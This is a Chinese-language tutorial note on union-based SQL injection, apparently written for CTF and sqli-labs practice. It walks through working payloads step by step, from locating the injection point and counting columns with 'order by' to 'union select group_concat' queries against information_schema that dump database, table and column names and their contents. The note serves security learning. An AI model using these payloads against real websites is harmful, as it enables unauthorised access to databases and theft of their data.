# 【SQL注入】联合查询注入

## 简介

联合注入（Union-based SQL Injection）是一种SQL注入技术，它利用了SQL中的`UNION`操作符来合并两个或多个`SELECT`语句的结果集。攻击者通过这种方法可以从数据库中提取额外的信息，如表名、列名以及其中的数据。

![](D:\security-labs\漏洞\SQL注入\information_schema（数据库）.png)

## 步骤

1. 判断注入点（也就是如何闭合）

   > 由于之前的文章里已经解释了SQL存在隐式类型转换，因此，在判断注入方式时最好不要以数字开头，推荐用`'[]`这样的字符，更方便判断

2. 爆回显列数，输入`order by 3--+`，逐步增加，直到不正常回显。

3. 强制前一个查询不返回任何行，这样可以让`UNION SELECT`部分的结果成为整个查询的唯一输出。方法有`?id=1' and 1=2 union select...`或者是`id = -1' union select...`

4. 爆出所有数据库名称`union select 1,2,group_concat(schema_name) from information_schema.schemata--+`

   > `group_concat(schema_name)`的作用是从`information_schema.schemata`表中选择所有的`schema_name`字段值，并将这些值通过逗号或其他指定的分隔符连接起来作为一个单一的结果返回。这使得你能够一次性查看**所有数据库的名字**

5. 爆出关键数据库下所有的表的名称` union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctfshow'--+`

   > `information_schema.tables`就是所有表的名单，`table_schema`就是在哪个数据库，`table_name`就是表的名称

6. 爆表下所有字段：`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='xxx'--+`

7. 爆列内容：`?id=-1' union select 1,2,group_concat(xxx) from schema.table--+`

## 实战

建议练习一下sqli-labs的less1-4关，网上已经有很多通关教程了，这里不再赘述。

